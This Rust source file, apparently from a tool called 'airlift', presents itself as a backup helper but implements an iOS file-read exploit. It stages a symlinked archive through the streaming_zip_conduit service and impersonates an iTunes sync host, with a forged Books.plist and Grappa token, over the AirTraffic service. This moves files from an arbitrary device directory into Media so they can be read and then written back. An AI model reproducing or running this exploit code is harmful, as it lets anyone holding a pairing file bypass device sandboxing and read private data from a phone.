//! Device half of the desktop export-read-restore backup.
//!
//! `airlift-read` decides the order and when Media/recovered may be deleted.
//! This file only performs the AFC / AirTraffic steps. It does not upload bytes.

use std::ffi::{c_char, c_void};
use std::path::Path;

use airlift_read::{
    plan_read, run_export_read_restore, BackupIo, BooksSnapshot, ReadPlan, SessionOutcome,
    AFC_READ_LIMIT, CODE_BAD_ARG, CODE_FAILED, STAGING_MARKER, TRACKED_BOOKS_FILES,
};
use idevice::afc::errors::AfcError;
use idevice::afc::opcode::AfcFopenMode;
use idevice::afc::AfcClient;
use idevice::IdeviceError;
use tokio::io::{AsyncReadExt, AsyncWriteExt};

use super::{atc_message_name, connect_tunnel, make_atc_msg, read_atc_dict, send_atc_dict, AppDeviceTunnel, Logger};

struct DeviceIo<'a> {
    tunnel: &'a mut AppDeviceTunnel,
    afc: &'a mut AfcClient,
    logger: &'a Logger,
}

impl DeviceIo<'_> {
    fn absent(err: &IdeviceError) -> bool {
        matches!(err, IdeviceError::Afc(AfcError::ObjectNotFound))
    }

    async fn ensure_parent(&mut self, path: &str) {
        let mut cursor = String::new();
        let parts: Vec<&str> = path.split('/').collect();
        if parts.len() < 2 {
            return;
        }
        for part in &parts[..parts.len() - 1] {
            if part.is_empty() {
                continue;
            }
            if !cursor.is_empty() {
                cursor.push('/');
            }
            cursor.push_str(part);
            let _ = self.afc.mk_dir(&cursor).await;
        }
    }
}

impl BackupIo for DeviceIo<'_> {
    async fn snapshot_books(&mut self) -> Result<BooksSnapshot, String> {
        let mut snap = BooksSnapshot::new();
        for path in TRACKED_BOOKS_FILES {
            match self.afc.get_file_info(*path).await {
                Ok(info) => {
                    if info.size > AFC_READ_LIMIT {
                        return Err(format!("{path} exceeds the snapshot cap"));
                    }
                    let mut fd = self
                        .afc
                        .open(*path, AfcFopenMode::RdOnly)
                        .await
                        .map_err(|e| format!("open {path}: {e:?}"))?;
                    let data = fd
                        .read_entire()
                        .await
                        .map_err(|e| format!("read {path}: {e:?}"))?;
                    let _ = fd.close().await;
                    snap.insert((*path).to_owned(), Some(data));
                }
                Err(err) if Self::absent(&err) => {
                    snap.insert((*path).to_owned(), None);
                }
                Err(err) => return Err(format!("snapshot {path}: {err:?}")),
            }
        }
        Ok(snap)
    }

    async fn stage(&mut self, plan: &ReadPlan) -> Result<(), String> {
        let archive = super::build_archive(&plan.target_dir, STAGING_MARKER)
            .map_err(|e| format!("build_archive: {e}"))?;
        let identifiers = vec![plan.link_identifier.clone(), plan.target_identifier.clone()];
        let books_plist = super::build_books_plist(&identifiers)
            .map_err(|e| format!("build_books_plist: {e}"))?;

        self.logger.log(format!(
            "airlift read: staging export for {} (archive {} bytes)",
            plan.leaf,
            archive.len()
        ));

        let mut zip_stream = self
            .tunnel
            .connect_service("com.apple.streaming_zip_conduit", self.logger)
            .await?;

        let mut zip_init_dict = plist::Dictionary::new();
        zip_init_dict.insert("MediaSubdir".to_string(), plist::Value::String(plan.source.clone()));
        let mut init_buf = Vec::new();
        plist::to_writer_binary(&mut init_buf, &plist::Value::Dictionary(zip_init_dict))
            .map_err(|e| format!("encode MediaSubdir: {e}"))?;
        zip_stream
            .write_all(&(init_buf.len() as u32).to_be_bytes())
            .await
            .map_err(|e| format!("write MediaSubdir length: {e}"))?;
        zip_stream
            .write_all(&init_buf)
            .await
            .map_err(|e| format!("write MediaSubdir body: {e}"))?;
        zip_stream.flush().await.map_err(|e| format!("flush: {e}"))?;
        zip_stream
            .write_all(&archive)
            .await
            .map_err(|e| format!("write archive bytes: {e}"))?;
        zip_stream.flush().await.map_err(|e| format!("flush: {e}"))?;

        let mut resp_len_buf = [0u8; 4];
        zip_stream
            .read_exact(&mut resp_len_buf)
            .await
            .map_err(|e| format!("read zip response length: {e}"))?;
        let resp_len = u32::from_be_bytes(resp_len_buf) as usize;
        let mut resp_body = vec![0u8; resp_len];
        zip_stream
            .read_exact(&mut resp_body)
            .await
            .map_err(|e| format!("read zip response body: {e}"))?;
        drop(zip_stream);

        let source_link = format!("{}/p0/p1/p2/link", plan.source);
        if self.afc.get_file_info(&plan.source).await.is_err()
            || self.afc.get_file_info(&source_link).await.is_err()
        {
            let _ = self.afc.remove_all(&plan.source).await;
            return Err("stage verification failed".into());
        }

        let _ = self.afc.mk_dir("Airlock").await;
        let _ = self.afc.mk_dir("Airlock/Book").await;
        let _ = self.afc.mk_dir("Books").await;
        let _ = self.afc.mk_dir("Books/Sync").await;
        let mut books_fd = self
            .afc
            .open("Books/Sync/Books.plist", AfcFopenMode::WrOnly)
            .await
            .map_err(|e| format!("AFC open Books.plist: {e:?}"))?;
        books_fd
            .write_entire(&books_plist)
            .await
            .map_err(|e| format!("AFC write Books.plist: {e:?}"))?;
        let _ = books_fd.close().await;
        Ok(())
    }

    async fn airtraffic_export(&mut self, plan: &ReadPlan) -> Result<(), String> {
        let identifiers = [plan.link_identifier.as_str(), plan.target_identifier.as_str()];
        let destinations = [plan.link_destination.as_str(), plan.recovered.as_str()];
        // Destinations are the Media link and Media/recovered. The staging marker
        // is not one of them, so this move does not overwrite the pass with it.
        if destinations.iter().any(|dest| dest.contains("payload")) {
            return Err("refusing export that publishes the staging payload".into());
        }

        let mut atc_stream = self
            .tunnel
            .connect_service("com.apple.atc", self.logger)
            .await?;

        let mut grappa_info: Option<(u32, u32, u32)> = None;
        for _ in 0..12 {
            match tokio::time::timeout(std::time::Duration::from_millis(1500), read_atc_dict(&mut atc_stream)).await
            {
                Ok(Ok(dict)) => {
                    if let Some(name) = atc_message_name(&dict) {
                        self.logger.log(format!("airlift read: atc '{name}'"));
                        if name == "Capabilities" {
                            if let Some(params) = dict.get("Params").and_then(|p| p.as_dictionary()) {
                                if let Some(gi) = params.get("GrappaSupportInfo").and_then(|g| g.as_dictionary()) {
                                    let ver = gi.get("version").and_then(|v| v.as_unsigned_integer()).unwrap_or(1) as u32;
                                    let dt = gi.get("deviceType").and_then(|v| v.as_unsigned_integer()).unwrap_or(0) as u32;
                                    let pv = gi.get("protocolVersion").and_then(|v| v.as_unsigned_integer()).unwrap_or(1) as u32;
                                    grappa_info = Some((ver, dt, pv));
                                }
                            }
                        }
                        if name == "SyncAllowed" {
                            break;
                        }
                    }
                }
                Ok(Err(_)) => break,
                Err(_) => {}
            }
        }

        let mut host_info_dict = plist::Dictionary::new();
        host_info_dict.insert("Type".into(), plist::Value::String("iTunes".into()));
        host_info_dict.insert("Version".into(), plist::Value::String("13.7.0.161".into()));
        host_info_dict.insert("MacOSVersion".into(), plist::Value::String("15.0".into()));
        host_info_dict.insert("SyncHostName".into(), plist::Value::String("airlift".into()));
        let library_id = format!(
            "{}-{}-{}-{}-{}",
            super::random_hex(4),
            super::random_hex(2),
            super::random_hex(2),
            super::random_hex(2),
            super::random_hex(6)
        );
        host_info_dict.insert("LibraryID".into(), plist::Value::String(library_id));
        host_info_dict.insert(
            "SyncedDataclasses".into(),
            plist::Value::Array(vec![plist::Value::String("Book".into())]),
        );
        host_info_dict.insert(
            "SyncedAssetTypes".into(),
            plist::Value::Array(vec![plist::Value::String("Book".into())]),
        );
        host_info_dict.insert("Wakeable".into(), plist::Value::Boolean(false));
        let grappa_token = crate::grappa::generate_grappa_token(grappa_info, |s| self.logger.log(s));
        if let Some(ref token) = grappa_token {
            host_info_dict.insert("Grappa".into(), plist::Value::Data(token.clone()));
        }

        let mut host_info_params = plist::Dictionary::new();
        host_info_params.insert("HostInfo".into(), plist::Value::Dictionary(host_info_dict.clone()));
        host_info_params.insert("LocalCloudSupport".into(), plist::Value::Boolean(false));
        send_atc_dict(&mut atc_stream, &make_atc_msg("HostInfo", 0, Some(host_info_params))).await?;
        tokio::time::sleep(std::time::Duration::from_millis(200)).await;

        let mut sync_req_params = plist::Dictionary::new();
        sync_req_params.insert(
            "Dataclasses".into(),
            plist::Value::Array(vec![plist::Value::String("Book".into())]),
        );
        sync_req_params.insert("DataclassAnchors".into(), plist::Value::Dictionary(plist::Dictionary::new()));
        sync_req_params.insert("HostInfo".into(), plist::Value::Dictionary(host_info_dict));
        if let Some(token) = grappa_token {
            sync_req_params.insert("Grappa".into(), plist::Value::Data(token));
        }
        send_atc_dict(
            &mut atc_stream,
            &make_atc_msg("RequestingSync", 1, Some(sync_req_params)),
        )
        .await?;

        let mut ready = false;
        for _ in 0..24 {
            match tokio::time::timeout(std::time::Duration::from_secs(5), read_atc_dict(&mut atc_stream)).await {
                Ok(Ok(dict)) => {
                    if let Some(name) = atc_message_name(&dict) {
                        if name == "Ping" {
                            let _ = send_atc_dict(&mut atc_stream, &make_atc_msg("Pong", 1, None)).await;
                            continue;
                        }
                        if name == "ReadyForSync" || name == "AssetManifest" {
                            ready = true;
                            break;
                        }
                        if name == "SyncFailed" {
                            continue;
                        }
                    }
                }
                Ok(Err(e)) => return Err(format!("ATC read error: {e}")),
                Err(_) => {}
            }
        }
        if !ready {
            return Err("AirTraffic: ReadyForSync not observed".into());
        }

        let mut sync_types = plist::Dictionary::new();
        sync_types.insert("Book".into(), plist::Value::Integer(1.into()));
        let mut meta_params = plist::Dictionary::new();
        meta_params.insert("SyncTypes".into(), plist::Value::Dictionary(sync_types));
        meta_params.insert("DataclassAnchors".into(), plist::Value::Dictionary(plist::Dictionary::new()));
        send_atc_dict(
            &mut atc_stream,
            &make_atc_msg("FinishedSyncingMetadata", 1, Some(meta_params)),
        )
        .await?;

        let mut manifest_observed = false;
        for _ in 0..20 {
            match tokio::time::timeout(std::time::Duration::from_secs(5), read_atc_dict(&mut atc_stream)).await {
                Ok(Ok(dict)) => {
                    if let Some(name) = atc_message_name(&dict) {
                        if name == "Ping" {
                            let _ = send_atc_dict(&mut atc_stream, &make_atc_msg("Pong", 1, None)).await;
                            continue;
                        }
                        if name == "AssetManifest" {
                            manifest_observed = true;
                            break;
                        }
                        if name == "SyncFailed" {
                            continue;
                        }
                        if name == "SyncFinished" {
                            break;
                        }
                    }
                }
                Ok(Err(e)) => return Err(format!("ATC manifest read error: {e}")),
                Err(_) => {}
            }
        }
        if !manifest_observed {
            return Err("AirTraffic: AssetManifest not observed".into());
        }

        for (idx, (id, dest)) in identifiers.iter().zip(destinations.iter()).enumerate() {
            let mut params = plist::Dictionary::new();
            params.insert("AssetID".into(), plist::Value::String((*id).to_owned()));
            params.insert("Dataclass".into(), plist::Value::String("Book".into()));
            params.insert("AssetPath".into(), plist::Value::String((*dest).to_owned()));
            send_atc_dict(&mut atc_stream, &make_atc_msg("FileComplete", 1, Some(params))).await?;
            if idx + 1 < identifiers.len() {
                tokio::time::sleep(std::time::Duration::from_millis(900)).await;
            }
        }
        tokio::time::sleep(std::time::Duration::from_secs(2)).await;
        drop(atc_stream);
        self.logger
            .log(format!("airlift read: export issued for {}", plan.leaf));
        Ok(())
    }

    async fn afc_read(&mut self, media_path: &str) -> Result<Vec<u8>, String> {
        if media_path.is_empty()
            || media_path.starts_with('/')
            || media_path.split('/').any(|part| part.is_empty() || part == "." || part == "..")
        {
            return Err("unsafe media path".into());
        }
        match self.afc.get_file_info(media_path).await {
            Err(err) if Self::absent(&err) => Err(format!("not found: {media_path}")),
            Err(err) => Err(format!("stat {media_path}: {err:?}")),
            Ok(info) => {
                if info.size == 0 || info.size > AFC_READ_LIMIT {
                    return Err(format!("refusing media object of {} bytes", info.size));
                }
                let mut fd = self
                    .afc
                    .open(media_path, AfcFopenMode::RdOnly)
                    .await
                    .map_err(|e| format!("open {media_path}: {e:?}"))?;
                let data = fd
                    .read_entire()
                    .await
                    .map_err(|e| format!("read {media_path}: {e:?}"))?;
                let _ = fd.close().await;
                if data.len() != info.size {
                    return Err("short AFC read".into());
                }
                self.logger
                    .log(format!("airlift read: captured {} bytes from Media", data.len()));
                Ok(data)
            }
        }
    }

    async fn write_back(&mut self, plan: &ReadPlan, bytes: &[u8]) -> Result<(), String> {
        if bytes == STAGING_MARKER {
            return Err("refusing to write the staging marker".into());
        }
        self.logger.log(format!(
            "airlift read: writing {} original bytes back to {}",
            bytes.len(),
            plan.leaf
        ));
        super::exploit_write_single_file(
            self.tunnel,
            self.afc,
            &plan.target_dir,
            &plan.leaf,
            bytes,
            self.logger,
        )
        .await
    }

    async fn restore_books(&mut self, books: &BooksSnapshot) -> Result<(), String> {
        for (path, data) in books {
            if let Some(bytes) = data {
                self.ensure_parent(path).await;
                let mut fd = self
                    .afc
                    .open(path, AfcFopenMode::WrOnly)
                    .await
                    .map_err(|e| format!("restore open {path}: {e:?}"))?;
                fd.write_entire(bytes)
                    .await
                    .map_err(|e| format!("restore write {path}: {e:?}"))?;
                let _ = fd.close().await;
            } else if let Err(err) = self.afc.remove(path).await {
                if !Self::absent(&err) {
                    return Err(format!("restore remove {path}: {err:?}"));
                }
            }
        }
        self.logger.log("airlift read: Books preimage restored");
        Ok(())
    }

    async fn remove_staging(&mut self, plan: &ReadPlan) -> Result<(), String> {
        // Source and link only. Media/recovered is a separate call.
        let _ = self.afc.remove_all(&plan.link_destination).await;
        let _ = self.afc.remove_all(&plan.source).await;
        Ok(())
    }

    async fn remove_recovered(&mut self, plan: &ReadPlan) -> Result<(), String> {
        match self.afc.remove(&plan.recovered).await {
            Ok(()) => Ok(()),
            Err(err) if Self::absent(&err) => Ok(()),
            Err(err) => Err(format!("remove recovered: {err:?}")),
        }
    }
}

async fn exploit_read_file(
    pairing_path: String,
    target_dir: String,
    leaf: String,
    recovery_dir: String,
    logger: &Logger,
) -> SessionOutcome {
    if recovery_dir.is_empty() {
        return SessionOutcome::fail(CODE_BAD_ARG, "recovery_dir is required", None);
    }
    let token = super::random_hex(10);
    let plan = match plan_read(&target_dir, &leaf, &token) {
        Ok(plan) => plan,
        Err(error) => return SessionOutcome::fail(CODE_BAD_ARG, error, None),
    };
    let pairing_bytes = match std::fs::read(&pairing_path) {
        Ok(bytes) => bytes,
        Err(error) => {
            return SessionOutcome::fail(
                CODE_FAILED,
                format!("Failed to read pairing file at {pairing_path}: {error}"),
                None,
            );
        }
    };
    let mut tunnel = match connect_tunnel(&pairing_bytes, logger).await {
        Ok(tunnel) => tunnel,
        Err(error) => return SessionOutcome::fail(CODE_FAILED, error, None),
    };
    let mut afc = match tunnel.connect_afc(logger).await {
        Ok(afc) => afc,
        Err(error) => return SessionOutcome::fail(CODE_FAILED, error, None),
    };
    logger.log(format!("airlift read: begin {}", plan.leaf));
    let mut io = DeviceIo {
        tunnel: &mut tunnel,
        afc: &mut afc,
        logger,
    };
    run_export_read_restore(&mut io, &plan, Some(Path::new(&recovery_dir))).await
}

/// # Safety
/// Pointers must be null or valid for their documented use. On success and on
/// codes 2 and 3, `*out_bytes` is owned by the caller and freed with `al_bytes_free`.
pub unsafe fn read_existing_file(
    pairing_path: *const c_char,
    target_dir: *const c_char,
    leaf: *const c_char,
    recovery_dir: *const c_char,
    log_cb: super::ALLogCallback,
    ctx: *mut c_void,
    out_bytes: *mut *mut u8,
    out_len: *mut usize,
    out_error: *mut *mut c_char,
) -> i32 {
    if out_bytes.is_null() || out_len.is_null() {
        return CODE_BAD_ARG;
    }
    *out_bytes = std::ptr::null_mut();
    *out_len = 0;

    let pairing_path = crate::ffi_util::opt_str(pairing_path, "");
    let target_dir = crate::ffi_util::opt_str(target_dir, "");
    let leaf = crate::ffi_util::opt_str(leaf, "");
    let recovery_dir = crate::ffi_util::opt_str(recovery_dir, "");
    if pairing_path.is_empty() || target_dir.is_empty() || leaf.is_empty() || recovery_dir.is_empty() {
        if !out_error.is_null() {
            *out_error = crate::ffi_util::cstr("pairing_path, target_dir, leaf, and recovery_dir are required");
        }
        return CODE_BAD_ARG;
    }
    let ctx_usize = ctx as usize;
    let res = crate::ffi_util::run_with_large_stack("al_exploit_read_file", move || {
        let logger = Logger {
            cb: log_cb,
            ctx: ctx_usize as *mut c_void,
        };
        idevice_ffi::run_sync_local(exploit_read_file(
            pairing_path,
            target_dir,
            leaf,
            recovery_dir,
            &logger,
        ))
    });

    let outcome = match res {
        Ok(outcome) => outcome,
        Err(panic_msg) => SessionOutcome::fail(CODE_FAILED, panic_msg, None),
    };
    if let Some(bytes) = outcome.bytes {
        let boxed = bytes.into_boxed_slice();
        *out_len = boxed.len();
        *out_bytes = Box::into_raw(boxed) as *mut u8;
    }
    if outcome.code != 0 && !out_error.is_null() {
        *out_error = crate::ffi_util::cstr(outcome.error);
    }
    outcome.code
}

/// # Safety
/// `p` must be null or a pointer returned by `al_exploit_read_file` with the same `len`.
#[no_mangle]
pub unsafe extern "C" fn al_bytes_free(p: *mut u8, len: usize) {
    if p.is_null() {
        return;
    }
    drop(Box::from_raw(std::slice::from_raw_parts_mut(p, len)));
}

/// # Safety
/// See `airlift.h`.
#[no_mangle]
pub unsafe extern "C" fn al_exploit_read_file(
    pairing_path: *const c_char,
    target_dir: *const c_char,
    leaf: *const c_char,
    recovery_dir: *const c_char,
    log_cb: super::ALLogCallback,
    ctx: *mut c_void,
    out_bytes: *mut *mut u8,
    out_len: *mut usize,
    out_error: *mut *mut c_char,
) -> i32 {
    let res = std::panic::catch_unwind(std::panic::AssertUnwindSafe(|| {
        read_existing_file(
            pairing_path,
            target_dir,
            leaf,
            recovery_dir,
            log_cb,
            ctx,
            out_bytes,
            out_len,
            out_error,
        )
    }));
    match res {
        Ok(code) => code,
        Err(_) => {
            if !out_error.is_null() {
                *out_error = crate::ffi_util::cstr("Rust panic in al_exploit_read_file");
            }
            CODE_FAILED
        }
    }
}
